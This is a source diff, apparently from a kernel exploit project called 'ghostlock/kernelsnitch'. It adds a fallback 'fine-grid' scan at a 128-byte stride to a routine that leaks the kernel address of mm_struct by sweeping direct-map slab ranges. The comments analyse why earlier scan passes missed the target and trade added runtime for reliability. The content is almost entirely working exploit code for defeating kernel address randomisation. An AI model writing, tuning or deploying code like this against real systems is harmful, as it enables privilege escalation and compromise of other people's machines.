@@ -229,6 +229,7 @@ namespace ghostlock::kernelsnitch {
         struct range range;
         int32_t try_canonical;
         int32_t sweep_tags;
+        int32_t fine_grid;
     };
 
     static int32_t __mm_candidate_matches(struct kernelsnitch_shared_state *ks, size_t candidate) {
@@ -260,6 +261,14 @@ namespace ghostlock::kernelsnitch {
          * warning in the build). MM_ORDER is small; the value is unchanged. */
         const size_t mm_slab_sz =
                 static_cast<size_t>(PAGE_SIZE) << ks->mm_slab_order;
+        /* v12.2: fine-grid pass. The mm_struct_sz (1280) stride from
+         * 32KB-stepped slab bases only covers 5 of the 160 possible 256-byte
+         * residue classes (32768 % 1280 = 768 shifts the grid every slab),
+         * so most true mm addresses fall between grid lines — the 10-03
+         * full-scan-no-match failures (161M candidates, zero hits, 0/25
+         * across boots). stride 128 covers every ≥128-aligned object;
+         * 20× the work, only used when the fast passes miss. */
+        const size_t cand_stride = mm_leak_arg->fine_grid ? 128 : ks->mm_struct_sz;
         for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
             ks->mm_progress = coarse_addr;
             if ((coarse_addr % (1ULL << 40)) == 0)
@@ -270,7 +279,7 @@ namespace ghostlock::kernelsnitch {
             for (size_t slab_addr = coarse_addr; (slab_addr < slab_end) && !ks->found; slab_addr += mm_slab_sz) {
                 size_t slab_limit = ghostlock::kernelsnitch::scan_limit(slab_addr, mm_slab_sz, slab_end);
                 for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_limit) && !ks->found;
-                     mm_struct_candidate += ks->mm_struct_sz) {
+                     mm_struct_candidate += cand_stride) {
                     if (mm_leak_arg->try_canonical) {
                         size_t canonical_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (0xfULL << 56);
                         if (__mm_candidate_matches(ks, canonical_candidate)) {
@@ -297,7 +306,8 @@ namespace ghostlock::kernelsnitch {
         return 0;
     }
 
-    static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical, int32_t sweep_tags) {
+    static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical, int32_t sweep_tags,
+                                   int32_t fine_grid) {
         /* the leak check discards a match past the measured end, so no slice
      * scans past it */
         const size_t ceiling = std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
@@ -311,6 +321,7 @@ namespace ghostlock::kernelsnitch {
             mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff * (i + 1);
             mm_leak_arg->try_canonical = try_canonical;
             mm_leak_arg->sweep_tags = sweep_tags;
+            mm_leak_arg->fine_grid = fine_grid;
             if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
                 mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
             if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
@@ -697,10 +708,16 @@ namespace ghostlock::kernelsnitch {
         ghostlock::kernel::reset_cpu_pin();
 
         ks->cand_tested = 0;
-        __run_mm_leak_pass(ks, 1, 0);
+        __run_mm_leak_pass(ks, 1, 0, 0);
         if (!ks->found) {
             ks->mm_progress = 0;
-            __run_mm_leak_pass(ks, 0, 1);
+            __run_mm_leak_pass(ks, 0, 1, 0);
+        }
+        if (!ks->found) {
+            /* v12.2: fine-grid last resort — 128-byte stride, every
+             * ≥128-aligned candidate; ~80s but closes the grid-gap class. */
+            ks->mm_progress = 0;
+            __run_mm_leak_pass(ks, 1, 1, 1);
         }
         ks->state = (ks->mm_struct == static_cast<size_t>(-1)) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
         if (ks->state == KERNELSNITCH_MM_NOT_FOUND) {
